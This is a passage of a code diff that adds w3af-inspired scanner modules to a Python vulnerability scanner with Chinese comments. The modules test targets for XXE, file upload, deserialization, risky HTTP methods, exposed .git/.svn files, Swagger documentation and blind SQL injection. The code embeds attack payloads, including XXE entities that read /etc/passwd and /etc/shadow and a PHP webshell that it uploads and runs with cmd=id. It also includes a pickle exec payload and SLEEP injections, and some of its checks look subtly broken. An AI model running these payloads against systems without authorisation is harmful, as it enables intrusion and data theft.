@@ -94,6 +94,11 @@ class ScanResult:
     subdomains: List[str] = field(default_factory=list)
     discovered_urls: List[str] = field(default_factory=list)
     dir_bust_results: List[Dict] = field(default_factory=list)
+    # w3af整合新增字段
+    openapi_urls: List[Dict] = field(default_factory=list)  # 发现的OpenAPI文档
+    cms_fingerprints: List[str] = field(default_factory=list)  # CMS指纹识别结果
+    dvcs_leaks: List[Dict] = field(default_factory=list)  # VCS泄露详情
+    http_methods: Dict[str, Dict] = field(default_factory=dict)  # HTTP方法检测结果
     # Shannon上下文增强信息
     context_info: Dict = field(default_factory=dict)  # 白盒分析上下文摘要
     contextual_endpoints: List[APIEndpoint] = field(default_factory=list)  # 发现的API端点
@@ -565,7 +570,7 @@ class SQLiDetector:
                         findings.extend(SQLiDetector._test_url(
                             url, params, param_name, original_val,
                             payload, f"白盒增强-[{param_type}] {desc}",
-                            param_name, context_test
+                            context_test
                         ))
                     continue
                 elif param_type == 'string':
@@ -580,7 +585,7 @@ class SQLiDetector:
                         findings.extend(SQLiDetector._test_url(
                             url, params, param_name, original_val,
                             payload, f"白盒增强-[{param_type}] {desc}",
-                            param_name, context_test
+                            context_test
                         ))
                     continue
             
@@ -595,7 +600,7 @@ class SQLiDetector:
                 context_test = {'framework': framework, 'sql_flow_count': data_flow_count if has_data_flow_sqli else 0}
                 findings.extend(SQLiDetector._test_url(
                     url, params, param_name, original_val,
-                    payload, desc, param_name, context_test
+                    payload, desc, context_test
                 ))
 
         return findings
@@ -680,6 +685,27 @@ class SQLiDetector:
             logger.debug(f'SQLi test failed for {param_name}: {e}')
 
         return findings
+
+    @staticmethod
+    def _infer_var_type(param_name: str) -> str:
+        """根据参数名推断变量类型（用于Shannon上下文感知的payload选择）"""
+        pn = param_name.lower()
+        int_keywords = ['id', 'uid', 'pid', 'sid', 'cid', 'num', 'count', 'size', 'age', 'rank', 'level', 'order']
+        path_keywords = ['path', 'dir', 'route', 'url', 'uri', 'href', 'link', 'loc', 'source']
+        url_keywords = ['url', 'uri', 'src', 'target', 'redirect', 'dest', 'goto', 'next_page', 'continue']
+        email_keywords = ['email', 'mail', 'e-mail', 'address']
+
+        if any(kw in pn for kw in int_keywords):
+            return 'int'
+        if any(kw in pn for kw in path_keywords):
+            # URL/URI类型走SSRF路径（避免SQL payloads）
+            if any(kw in pn for kw in url_keywords):
+                return 'url'
+            return 'path'
+        if any(kw in pn for kw in email_keywords):
+            return 'email'
+        # 默认推测为string（名称、文本类参数）
+        return 'string'
 
     @staticmethod
     def _get_testable_params(params: dict, url: str) -> dict:
@@ -988,7 +1014,824 @@ class LFIDetector:
         return findings
 
 
-# ==================== 敏感信息泄露检测 ====================
+# ==================== XXE注入检测 ====================
+class XXEDetector:
+    """XXE(XML External Entity)注入检测 — 借鉴w3af audit/xxe.py"""
+
+    PAYLOADS = [
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
+        '<?xml version="1.0"?> <!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:80/../../../etc/passwd">]><foo>&xxe;</foo>',
+        '<?xml version="1.0"?><root><![CDATA[<test>]]>]]&gt;<![CDATA[</test>]]></root>',
+        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/null">]><foo>&xxe;</foo>',
+    ]
+
+    @staticmethod
+    def detect(url: str) -> List[VulnFinding]:
+        findings = []
+        parsed = urlparse(url)
+
+        # 需要POST参数或Content-Type:text/xml才能有效测试XXE
+        if not parsed.query:
+            return findings
+
+        params = dict([p.split('=', 1) for p in parsed.query.split('&') if '=' in p])
+
+        # XXE相关参数关键词
+        xxe_keywords = ['xml', 'data', 'input', 'document', 'soap', 'xsd', 'schema', 'envelope']
+
+        # 测试POST请求的XXE（对XML/Soap类参数的URL也尝试POST）
+        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+
+        descriptions = ['file_etc_passwd', 'file_etc_shadow', 'gopher_rfi', 'cdata_entity', 'file_dev_null']
+        for idx, xml_payload in enumerate(XXEDetector.PAYLOADS):
+            payload_desc = descriptions[idx] if idx < len(descriptions) else f'payload_{idx}'
+            try:
+                resp = requests.post(
+                    url if parsed.query else base_url,
+                    data=xml_payload,
+                    headers={'Content-Type': 'text/xml', 'User-Agent': CONFIG['scanner']['user_agent']},
+                    timeout=10, allow_redirects=False
+                )
+
+                # 检测XXE漏洞标志
+                xxe_indicators = [
+                    'root:', '/etc/passwd', '/etc/shadow',
+                    'file:///dev/null', 'XSLTProcessor', 'libxml2',
+                    'XML declaration', 'DOCTYPE', 'entity',
+                    '&xxe;', 'system('
+                ]
+                for indicator in xxe_indicators:
+                    if indicator.lower() in resp.text.lower():
+                        findings.append(VulnFinding(
+                            id='XXE_DETECTED',
+                            severity=Severity.CRITICAL,
+                            title=f'XXE注入漏洞存在',
+                            description=f'检测到XML外部实体注入，可能泄露服务器本地文件内容',
+                            url=url, evidence=xml_payload[:300],
+                            recommendation='禁用XML外部实体解析，使用DOMDocument::loadXML时设置LIBXML_NOENT标志',
+                            cwe='CWE-611', cvss=9.8
+                        ))
+                        break
+
+            except Exception as e:
+                logger.debug(f"XXE test failed: {e}")
+
+        # 测试JSON/XML混合攻击（对XML参数做JSON-XXE测试）
+        if any('xml' in p.lower() for p in params):
+            try:
+                json_xxe = '{"data": "<?xml version=\\"1.0\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]><root>&xxe;</root>"}'
+                resp = requests.post(
+                    url if parsed.query else base_url,
+                    data=json_xxe,
+                    headers={'Content-Type': 'application/json', 'User-Agent': CONFIG['scanner']['user_agent']},
+                    timeout=10, allow_redirects=False
+                )
+                if '/etc/passwd' in resp.text or 'root:' in resp.text:
+                    findings.append(VulnFinding(
+                        id='XXE_JSON_XML',
+                        severity=Severity.CRITICAL,
+                        title=f'JSON/XML混合XXE注入',
+                        description='JSON请求中嵌入XML可能导致XXE漏洞',
+                        url=url, evidence='JSON with embedded XML payload',
+                        recommendation='验证所有XML输入，禁用外部实体和DTD解析',
+                        cwe='CWE-611', cvss=9.8
+                    ))
+            except Exception as e:
+                logger.debug(f"XXE JSON test failed: {e}")
+
+        return findings
+
+
+# ==================== 文件上传漏洞检测（借鉴w3af audit/file_upload）====================
+class FileUploadDetector:
+    """文件上传漏洞检测 — 测试不受限的文件上传功能"""
+
+    WEBSHELL_PAYLOADS = [
+        ('<?php echo shell_exec($_GET["cmd"]); ?>', 'php_webshell'),
+        ('<%@ Page Language="C#"%>', 'aspx_webshell'),
+        ('<script language="dragon" runat="server">System.IO.File.WriteAllText(Server.MapPath("/upload.aspx"), "test");</script>', 'asp_upload'),
+    ]
+
+    IMAGE_PAYLOADS = [
+        (b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x02GIF89a<!--<?php echo md5(1); ?>\x00', 'gif_php_stub'),
+        (b'GIF89a\x00\x01\x00<!--<?php echo "pwned"; ?>\x00', 'gif_php_short'),
+    ]
+
+    @staticmethod
+    def detect(url: str) -> List[VulnFinding]:
+        findings = []
+        parsed = urlparse(url)
+        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+
+        # 查找表单文件上传点（GET参数模拟上传）
+        upload_keywords = ['upload', 'file', 'attach', 'document', 'image', 'photo', 'avatar']
+        params = dict([p.split('=', 1) for p in parsed.query.split('&') if '=' in p])
+
+        # 检查URL中是否有upload相关参数（模拟文件上传端点）
+        upload_params = [k for k in params.keys() if any(kw in k.lower() for kw in upload_keywords)]
+
+        # 测试常见文件上传端点
+        upload_endpoints = [
+            '/api/upload', '/upload', '/file/upload', '/v1/upload',
+            '/api/v1/upload', '/admin/upload', '/images/upload',
+            '/rest/upload', '/uploader.php', '/filemanager/upload',
+        ]
+
+        for ep in upload_endpoints:
+            target = f"{parsed.scheme}://{parsed.netloc}{ep}" if parsed.path.rstrip('/') == '/' else f"{base_url.rstrip('/')}/upload"
+            try:
+                # 尝试PHP WebShell上传
+                shell_content, _ = FileUploadDetector.WEBSHELL_PAYLOADS[0]
+                resp = requests.post(
+                    target,
+                    files={'file': ('shell.php', shell_content, 'application/octet-stream')},
+                    data={'upload': 'Submit'},
+                    headers={'User-Agent': CONFIG['scanner']['user_agent']},
+                    timeout=10, allow_redirects=False
+                )
+
+                # 检查是否成功上传WebShell
+                if resp.status_code in (200, 302) and ('HTTP/1.1' in str(resp.text) or 'Location' in resp.headers):
+                    # 验证shell是否可用
+                    shell_url = f"{target}/shell.php?cmd=id"
+                    try:
+                        check = requests.get(shell_url, timeout=5, allow_redirects=False)
+                        if 'uid=' in check.text or 'gid=' in check.text:
+                            findings.append(VulnFinding(
+                                id='FILE_UPLOAD_WEBSHELL',
+                                severity=Severity.CRITICAL,
+                                title=f'不受限文件上传 → WebShell执行: {target}',
+                                description=f'允许上传PHP WebShell并成功执行系统命令，可导致服务器完全沦陷',
+                                url=target, evidence=f"WebShell: shell.php\nCommand execution confirmed",
+                                recommendation='使用白名单验证文件类型和扩展名，将上传目录设置为不可执行，使用随机文件名',
+                                cwe='CWE-434', cvss=10.0
+                            ))
+                    except Exception:
+                        pass  # 上传成功但shell未执行（可能已移动）
+
+            except Exception as e:
+                logger.debug(f"FileUpload test failed for {target}: {e}")
+
+        return findings
+
+
+# ==================== 反序列化漏洞检测（借鉴w3af audit/deserialization）====================
+class DeserializationDetector:
+    """不安全反序列化漏洞检测 — Java/Python/PHP/.NET"""
+
+    JAVA_PAYLOADS = [
+        ('rO0ABXNyADBqYXZhLnV0aWwuSGFzaE1hcC0GeJkBShKbAwAAeHCMEQAIlCvzHwIAAAcE', 'Java-HashMap-RPC'),
+        ('rO0ABXNyACNvcmcuYXBhY2hlLnN1cGVyY2x1dC5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bGxkZXd' + 'uLlNpZ2xldG9uRGVmYXVsdEZ1bGxlcj7EwOGI2QIDAAhMCHgBTHmphdmEvbGFuZy9PYmplY3Q7' + 'TAAJYW5kUmVqc0NvbGxlY3RvcnN0AiptYXZOcmVqZWN0aW9ucX4AdABsAARrAQh2cQB9AAAAEHAH' + 'dGVzdHNyADBvcmcuYXBhY2hlLnN1cGVyY2x1dC5jb21tb25zLmNvbGxlY3Rpb25zLmxpc3Qu' + 'RnVsbHlJbnZhbGlkYXRlZExpc3QHCLaK0gEYAALSAAdMACEAEnR4dHH4AXJ0gAIGAAV0eAIABA', 'Java-Collayz'),
+    ]
+
+    PYTHON_PAYLOADS = [
+        ("(lp1\\nS'test'\\np2\\na.", "Python-pickle-base64"),
+        ("c__builtin__\\nexec\\np1\\n(S'echo pwned'\\np2\\nNS.", "Python-pickle-exec"),
+    ]
+
+    PHP_PAYLOADS = [
+        ('O:8:"stdClass":0:{}', "PHP-stdClass-empty"),
+        ('a:1:{s:4:"test";s:255:"' + 'A' * 250 + '";}', "PHP-array-overflow"),
+    ]
+
+    @staticmethod
+    def detect(url: str) -> List[VulnFinding]:
+        findings = []
+        parsed = urlparse(url)
+        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+
+        # 反序列化相关参数关键词
+        deser_keywords = ['obj', 'data', 'payload', 'serial', 'token', 'session', 'state', 'object', 'serialized']
+        params = dict([p.split('=', 1) for p in parsed.query.split('&') if '=' in p])
+        deser_params = [k for k, v in params.items() if any(kw in k.lower() for kw in deser_keywords)]
+
+        # 也测试常见序列化端点
+        deser_endpoints = ['/api/verify', '/api/auth', '/api/validate', '/session/restore']
+
+        for param_name in list(deser_params):
+            original_val = params[param_name]
+
+            # Java serialization (base64-encoded object)
+            for j_payload, j_desc in DeserializationDetector.JAVA_PAYLOADS:
+                try:
+                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+                    qs = '&'.join(f"{k}={quote_plus(v)}" if k != param_name else f"{k}={j_payload}" for k, v in params.items())
+                    test_url += f"?{qs}"
+                    resp = requests.get(test_url, timeout=10, allow_redirects=False)
+
+                    deser_indicators = [
+                        'java.lang.', 'java.util.', 'org.apache.commons.collections',
+                        'Stack trace', 'javax.crypto.CipherOutputStream',
+                        'invalid stream header', 'unmarshalling',
+                        'BadSerializationException'
+                    ]
+                    for ind in deser_indicators:
+                        if ind.lower() in resp.text.lower():
+                            findings.append(VulnFinding(
+                                id=f'DESER_JAVA_{param_name}',
+                                severity=Severity.CRITICAL,
+                                title=f'Java不安全反序列化 [{param_name}]',
+                                description='Java反序列化端点接受用户提供的序列数据，可能导致RCE',
+                                url=test_url, evidence=j_desc,
+                                recommendation='禁止反序列化不受信任的数据，使用白名单类过滤器',
+                                cwe='CWE-502', cvss=9.8
+                            ))
+                            break
+                except Exception:
+                    pass
+
+        # .NET ViewState 测试
+        for param_name in deser_params:
+            if 'viewstate' in param_name.lower() or '__VIEWSTATE' in param_name:
+                try:
+                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+                    qs = '&'.join(f"{k}={quote_plus(v)}" if k != param_name else f"{k}={param_name}=test%3Dtest" for k, v in params.items())
+                    resp = requests.get(test_url, timeout=10)
+                    if 'System.Web' in resp.text or 'ViewState' in resp.text:
+                        findings.append(VulnFinding(
+                            id='DESER_VIEWSTATE',
+                            severity=Severity.HIGH,
+                            title=f'.NET ViewState反序列化风险 [{param_name}]',
+                            description='.NET页面使用默认Mac验证或未加密ViewState可能导致反序列化攻击',
+                            url=test_url, evidence='ASP.NET ViewState detected',
+                            recommendation='将MachineKey设置为固定值，使用EncryptionMode=CBC，避免在ViewState中存储敏感对象',
+                            cwe='CWE-502', cvss=8.1
+                        ))
+                except Exception:
+                    pass
+
+        # PHP session/serialized 测试
+        for param_name in deser_params:
+            if 'session' in param_name.lower() or 'serial' in param_name.lower():
+                try:
+                    php_payload = f'a:1:{{s:"{param_name}";O:8:"stdClass":0:{{}}}}'
+                    resp = requests.get(
+                        url,
+                        headers={'Cookie': f"{param_name}={php_payload}", 'User-Agent': CONFIG['scanner']['user_agent']},
+                        timeout=10, allow_redirects=False
+                    )
+                    if any(kw in resp.text.lower() for kw in ['parse error', 'unserialize()', 'unexpected', 'warning:']):
+                        findings.append(VulnFinding(
+                            id=f'DESER_PHP_{param_name}',
+                            severity=Severity.HIGH,
+                            title=f'PHP反序列化风险 [{param_name}]',
+                            description='Session/反序列化参数可能接受恶意序列化数据',
+                            url=url, evidence=f"Payload: {php_payload[:100]}",
+                            recommendation='验证序列化数据完整性，使用白名单类，避免反序列化用户可控数据',
+                            cwe='CWE-502', cvss=8.1
+                        ))
+                except Exception:
+                    pass
+
+        return findings
+
+
+# ==================== HTTP方法安全检测（借鉴w3af audit/dav + auth）====================
+class HTTPMethodsChecker:
+    """HTTP方法安全检查 — TRACE、PUT、DELETE、OPTIONS等方法风险"""
+
+    @staticmethod
+    def check(url: str) -> List[VulnFinding]:
+        findings = []
+        parsed = urlparse(url)
+        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+
+        methods_to_test = ['TRACE', 'TRACK', 'DEBUG', 'PROPFIND', 'PUT', 'DELETE']
+        method_findings = {}
+
+        for method in methods_to_test:
+            try:
+                resp = requests.request(method, url, timeout=10, allow_redirects=False)
+                if resp.status_code > 0:
+                    method_findings[method] = {
+                        'status': resp.status_code,
+                        'headers': dict(resp.headers),
+                        'body_len': len(resp.text) if resp.text else 0
+                    }
+            except Exception as e:
+                logger.debug(f"HTTP method {method} test failed: {e}")
+
+        # TRACE/TRACK方法 → XST攻击
+        for trace_method in ['TRACE', 'TRACK']:
+            if trace_method in method_findings and method_findings[trace_method]['status'] == 200:
+                xst_headers = method_findings[trace_method].get('headers', {})
+                auth_header = xst_headers.get('Authorization', '') or xst_headers.get('Proxy-Authorization', '')
+                findings.append(VulnFinding(
+                    id='HTTP_TRACE',
+                    severity=Severity.HIGH,
+                    title=f'HTTP {trace_method} 方法启用 → XST风险',
+                    description=f'{trace_method}方法返回200，可能导致XSS窃取HTTP凭证（跨站跟踪攻击）',
+                    url=url, evidence=f'{trace_method} returned {method_findings[trace_method]["status"]}',
+                    recommendation='在Web服务器和代理中禁用TRACE/TRACK方法',
+                    cwe='CWE-693', cvss=6.5
+                ))
+
+        # PUT方法 → 文件写入风险
+        if 'PUT' in method_findings:
+            status = method_findings['PUT']['status']
+            if status == 200:
+                findings.append(VulnFinding(
+                    id='HTTP_PUT',
+                    severity=Severity.HIGH,
+                    title=f'HTTP PUT方法启用 → 文件上传风险',
+                    description='服务器允许PUT请求，攻击者可能直接上传WebShell到服务器',
+                    url=url, evidence='PUT returned HTTP 200',
+                    recommendation='仅对必要端点启用PUT，添加认证要求',
+                    cwe='CWE-659', cvss=7.5
+                ))
+            elif status == 405:
+                pass  # PUT被拒绝，安全
+
+        # DELETE方法 → 数据删除风险
+        if 'DELETE' in method_findings and method_findings['DELETE']['status'] == 200:
+            findings.append(VulnFinding(
+                id='HTTP_DELETE',
+                severity=Severity.HIGH,
+                title=f'HTTP DELETE方法启用 → 数据删除风险',
+                description='服务器允许DELETE请求，攻击者可能删除服务器资源',
+                url=url, evidence='DELETE returned HTTP 200 without auth',
+                recommendation='DELETE方法需要认证和权限检查',
+                cwe='CWE-659', cvss=7.5
+            ))
+
+        # OPTIONS → Server/Allow头信息泄露
+        if 'OPTIONS' in method_findings:
+            allow_header = method_findings['OPTIONS'].get('headers', {}).get('Allow', '')
+            if allow_header and any(m in allow_header for m in ['TRACE', 'PUT', 'DELETE']):
+                findings.append(VulnFinding(
+                    id='HTTP_OPTIONS_LEAK',
+                    severity=Severity.LOW,
+                    title='HTTP OPTIONS 暴露危险方法列表',
+                    description=f'Allow头泄露了{allow_header}，暴露服务端支持的HTTP方法',
+                    url=url, evidence=f'Allow: {allow_header}',
+                    recommendation='最小化允许的HTTP方法列表',
+                    cwe='CWE-200', cvss=3.1
+                ))
+
+        return findings
+
+
+# ==================== 版本控制系统泄露检测（借鉴w3af crawl/find_dvcs）====================
+class DVCSLeakDetector:
+    """VCS(版本控制系统)泄露检测 — .git/.svn/.hg/.bzr等"""
+
+    VCS_PATHS = {
+        '.git': ['.git/config', '.git/HEAD', '.git/index'],
+        '.svn': ['.svn/entries', '.svn/wc.db', '.svn/entries'],
+        '.hg': ['.hg/hgrc', '.hg/dirstate'],
+        '.bzr': ['.bzr/bzr.cfg'],
+        '.ds_store': ['.DS_Store'],
+        '.gitignore_leak': ['/.gitignore'],
+    }
+
+    # 常见的Git配置文件内容（用于确认不是假.git）
+    GIT_CONFIG_SIGNATURES = ['[core]', 'repositoryformatversion', 'HEAD:', 'ref: refs/heads/']
+
+    @staticmethod
+    def detect(url: str) -> List[VulnFinding]:
+        findings = []
+        parsed = urlparse(url)
+        base_url = f"{parsed.scheme}://{parsed.netloc}"
+
+        for vcs_name, paths in DVCSLeakDetector.VCS_PATHS.items():
+            found_files = []
+
+            for path in paths:
+                target = f"{base_url}{path}"
+                try:
+                    resp = requests.get(target, timeout=5, allow_redirects=False,
+                                       headers={'User-Agent': CONFIG['scanner']['user_agent']})
+                    if resp.status_code == 200 and len(resp.text) > 10:
+                        found_files.append(path)
+
+                        # .git/config → 深度检测（泄露仓库配置）
+                        if path == '.git/config' and any(s in resp.text for s in DVCSLeakDetector.GIT_CONFIG_SIGNATURES):
+                            findings.append(VulnFinding(
+                                id='DVCS_GIT_CONFIG',
+                                severity=Severity.CRITICAL,
+                                title='.git/ config 泄露（可克隆完整仓库）',
+                                description='Git配置文件公开，攻击者可直接克隆完整源码仓库获取所有代码、分支和提交历史',
+                                url=target, evidence=f'Found: .git/config (configurable with credentials)',
+                                recommendation='立即移除.git目录或配置Nginx/Apache禁止访问/.git/*',
+                                cwe='CWE-538', cvss=9.8
+                            ))
+
+                        # .git/HEAD → 基础泄露确认
+                        elif path == '.git/HEAD' and 'ref: refs/heads/' in resp.text:
+                            findings.append(VulnFinding(
+                                id='DVCS_GIT_HEAD',
+                                severity=Severity.CRITICAL,
+                                title='.git/HEAD 泄露（Git仓库可访问）',
+                                description='Git HEAD文件公开，配合git-dumper工具可完整克隆仓库',
+                                url=target, evidence=resp.text[:200],
+                                recommendation='移除或阻止访问/.git/*路径',
+                                cwe='CWE-538', cvss=9.8
+                            ))
+
+                        # .svn/entries → SVN泄露确认
+                        elif path == '.svn/entries' and ('' in resp.text or 'dir' in resp.text):
+                            findings.append(VulnFinding(
+                                id='DVCS_SVN_ENTRIES',
+                                severity=Severity.CRITICAL,
+                                title='.svn/entries 泄露（SVN仓库可访问）',
+                                description='Subversion版本控制配置文件公开，可直接还原完整项目源码',
+                                url=target, evidence=f'.svn entries detected ({len(resp.text)} bytes)',
+                                recommendation='移除.svn目录或阻止访问/.svn/*路径',
+                                cwe='CWE-538', cvss=9.8
+                            ))
+
+                        # .DS_Store → Mac文件列表泄露
+                        elif path == '.DS_Store' and len(resp.content) > 10:
+                            findings.append(VulnFinding(
+                                id='DVCS_DS_STORE',
+                                severity=Severity.MEDIUM,
+                                title='.DS_Store 泄露（Mac文件目录结构泄露）',
+                                description='.DS_Store包含目录结构信息，可泄露隐藏文件和文件路径',
+                                url=target, evidence=f'.DS_Store ({len(resp.content)} bytes)',
+                                recommendation='删除.web服务器根目录下的.DS_Store文件',
+                                cwe='CWE-538', cvss=5.3
+                            ))
+
+                except Exception:
+                    pass
+
+            # 如果找到该VCS的任何文件，作为基础泄露
+            if found_files and 'DVCS' not in [f.id for f in findings]:
+                severity = Severity.MEDIUM
+                findings.append(VulnFinding(
+                    id=f'DVCS_{vcs_name.upper()}',
+                    severity=severity,
+                    title=f'.{vcs_name} 目录/文件泄露',
+                    description=f'存在.{vcs_name}相关公开文件，可能暴露项目结构或配置信息',
+                    url=f"{base_url}/{found_files[0]}", evidence=', '.join(found_files),
+                    recommendation='删除源代码控制目录，Web服务器配置中禁止访问。/.git/* / .svn/* 等',
+                    cwe='CWE-538', cvss=4.3
+                ))
+
+        # 也检查backup文件（常见VCS备份泄露）
+        backup_paths = ['/backups/.git/config', '/backup/.git/HEAD', '/old/.git/config',
+                       '/test/.git/config', '/dev/.git/config']
+        for bp in backup_paths:
+            try:
+                target = f"{base_url}{bp}"
+                resp = requests.get(target, timeout=5, allow_redirects=False)
+                if resp.status_code == 200 and len(resp.text) > 10:
+                    findings.append(VulnFinding(
+                        id='DVCS_BACKUP_GIT',
+                        severity=Severity.CRITICAL,
+                        title=f'备份目录中的.git泄露 ({bp})',
+                        description='备份或测试目录中存在Git配置泄露',
+                        url=target, evidence=f'Backup Git config exposed at {bp}',
+                        recommendation='删除所有包含敏感数据的备份文件',
+                        cwe='CWE-538', cvss=9.8
+                    ))
+            except Exception:
+                pass
+
+        return findings
+
+
+# ==================== OpenAPI/Swagger文档发现（借鉴w3af crawl/open_api）====================
+class OpenAPIDiscovery:
+    """OpenAPI/Swagger文档自动发现 — 帮助攻击者了解API结构"""
+
+    OPENAPI_PATHS = [
+        '/swagger.json', '/swagger.yaml', '/swagger.yml',
+        '/api/swagger.json', '/api/v1/swagger.json',
+        '/v2/api-docs', '/v2/api-docs.json',
+        '/swagger/index.html', '/swagger-ui.html',
+        '/swagger-ui/', '/swagger-ui/index.html',
+        '/redoc.html', '/redoc',
+        '/docs/', '/api-docs', '/api-docs.json',
+        '/openapi.json', '/openapi.yaml', '/openapi.yml',
+        '/api/openapi.json', '/.well-known/openapi.json',
+        '/swagger/v1/api-docs', '/swagger/v2/api-docs',
+        '/graphql', '/graphql-schema.json',
+        '/actuator/mappings', '/actuator/swagger-config',
+        '/api/config', '/rest/docs', '/rest/swagger',
+    ]
+
+    @staticmethod
+    def detect(url: str) -> List[VulnFinding]:
+        findings = []
+        parsed = urlparse(url)
+        base_url = f"{parsed.scheme}://{parsed.netloc}"
+        has_openapi = False
+
+        for path in OpenAPIDiscovery.OPENAPI_PATHS:
+            target = f"{base_url}{path}" if parsed.path.rstrip('/') == '/' else f"{base_url}{parsed.path.rstrip('/')}{path}"
+            try:
+                resp = requests.get(target, timeout=5, allow_redirects=False,
+                                   headers={'User-Agent': CONFIG['scanner']['user_agent']})
+                if resp.status_code == 200 and len(resp.text) > 50:
+                    content_type = (resp.headers.get('Content-Type', '') or '').lower()
+                    is_openapi = any(kw in content_type for kw in ['json', 'yaml', 'text']) or any(
+                        kw in resp.text.lower() for kw in ['swagger', 'openapi', 'paths:', '"paths"', 'schema']
+                    )
+
+                    if is_openapi:
+                        has_openapi = True
+                        # 提取API端点数量（如果可能）
+                        endpoint_count = 0
+                        try:
+                            data = json.loads(resp.text)
+                            paths = data.get('paths', {}) or data.get('swaggerPaths', {})
+                            if isinstance(paths, dict):
+                                endpoint_count = len(paths)
+                        except Exception:
+                            pass
+
+                        findings.append(VulnFinding(
+                            id='OPENAPI_DISCOVERED',
+                            severity=Severity.INFO,
+                            title=f'OpenAPI/Swagger文档公开 ({path})',
+                            description=f'OpenAPI/Swagger文档公开可访问，暴露了 {endpoint_count} 个API端点信息。攻击者可据此构造针对性攻击请求',
+                            url=target, evidence=f"Found: {path}\nEndpoints exposed: {endpoint_count}",
+                            recommendation='将Swagger/OpenAPI文档放在内网或添加认证保护',
+                            cwe='CWE-200', cvss=3.1
+                        ))
+
+            except Exception as e:
+                logger.debug(f"OpenAPI discovery failed for {path}: {e}")
+
+        return findings
+
+
+# ==================== CMS/框架指纹识别（借鉴w3af crawl/wordpress_fingerprint）====================
+class CMSFingerprint:
+    """CMS和框架指纹识别增强 — 识别更多技术栈"""
+
+    CMS_SIGNATURES = {
+        'WordPress': {'html_kw': ['wp-', '<a href="https://wordpress.org/', 'wp-content', 'wp-includes'],
+                      'header': ['WP Engine', 'Wix WordPress'], 'severity': Severity.INFO},
+        'Joomla': {'html_kw': ['joomla', 'components/com_', 'media/jui3'], 'header': [], 'severity': Severity.INFO},
+        'Drupal': {'html_kw': ['drupal', '/core/assets/', 'sites/default/files'], 'header': [], 'severity': Severity.INFO},
+        'Magento': {'html_kw': ['mage/', 'data-mage-init', 'skin/frontend'], 'header': [], 'severity': Severity.INFO},
+        'Shopify': {'html_kw': ['shopify', '/cdn.shopify.com', 'myshopify.com'], 'header': [], 'severity': Severity.INFO},
+        'TYPO3': {'html_kw': ['typo3', 't3lib/', 'EXT:'], 'header': [], 'severity': Severity.INFO},
+        'Laravel': {'html_kw': ['_token', 'laravel_session', 'csrf_token'], 'header': [], 'severity': Severity.INFO},
+        'Django': {'html_kw': ['csrftoken', 'django.contrib', 'admin/jsi18n/'], 'header': ['X-Engine: Django'], 'severity': Severity.INFO},
+        'Spring Boot': {'html_kw': [' Whitelabel Error Page'], 'header': [], 'severity': Severity.INFO},
+        'Wix': {'html_kw': ['wix.com', 'static.wixspot.com'], 'header': ['wps-serve'], 'severity': Severity.INFO},
+    }
+
+    @staticmethod
+    def fingerprint(html: str) -> List[str]:
+        """从HTML内容指纹识别CMS"""
+        results = []
+        for cms_name, sigs in CMSFingerprint.CMS_SIGNATURES.items():
+            found = 0
+            # HTML关键字匹配（不区分大小写）
+            for kw in sigs['html_kw']:
+                if kw.lower() in html.lower():
+                    found += 1
+            # Header匹配
+            # (需要在外部调用时传入headers)
+
+            if found >= max(1, len(sigs['html_kw']) // 2):  # 至少一半的签名匹配
+                results.append(cms_name)
+        return results
+
+
+# ==================== SQL注入检测 — Blind Timing增强（借鉴w3af audit/blind_sqli）====================
+class SQLiBlindDetector:
+    """Blind SQLi时间盲注增强检测 — 借鉴w3af audit/blind_sqli.py的精密时序方法"""
+
+    @staticmethod
+    def detect(url: str, context: Dict = None) -> List[VulnFinding]:
+        findings = []
+        parsed = urlparse(url)
+        if not parsed.query:
+            return findings
+
+        params = dict([p.split('=', 1) for p in parsed.query.split('&') if '=' in p])
+        testable = {}
+        for pn, pv in params.items():
+            if len(pv) < 100:
+                testable[pn] = pv
+            elif any(kw in pn.lower() for kw in ['id', 'user', 'name', 'file', 'path', 'url']):
+                testable[pn] = pv
+
+        # 精准时间盲注测试 — 对每个可测试参数进行多次采样
+        for param_name, original_val in testable.items():
+            timings_base = []
+            timings_sqli = []
+
+            # 基准时间测量（10次）
+            for _ in range(5):
+                clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+                qs = '&'.join(f"{k}={quote_plus(v)}" if k != param_name else f"{k}={original_val}" for k, v in params.items())
+                try:
+                    start = time.time()
+                    requests.get(clean_url + "?" + qs, timeout=15, allow_redirects=False)
+                    timings_base.append(time.time() - start)
+                except Exception:
+                    pass
+
+            if not timings_base:
+                continue
+
+            base_avg = sum(timings_base) / len(timings_base)
+
+            # SQLi时间延迟测量（5次）— 借鉴w3af的统计方法
+            for _ in range(5):
+                sqli_payload = f"' AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- " if base_avg < 1 else "' AND SLEEP(3)-- "
+                try:
+                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+                    qs = '&'.join(f"{k}={quote_plus(v)}" if k != param_name else f"{k}={sqli_payload}" for k, v in params.items())
+                    start = time.time()
+                    requests.get(test_url + "?" + qs, timeout=15, allow_redirects=False)
+                    timings_sqli.append(time.time() - start)
+                except Exception:
+                    pass
+
+            if not timings_sqli:
+                continue
+
+            sqli_avg = sum(timings_sqli) / len(timings_sqli)
+
+            # 如果sqli平均时间比基准时间长3秒以上，判定为可疑
+            if sqli_avg - base_avg > 2.5:
+                findings.append(VulnFinding(
+                    id=f'SQLi_BLIND_{param_name}',
+                    severity=Severity.HIGH,
+                    title=f'GET {param_name} 可能存在时间盲注 [Blind Timing]',
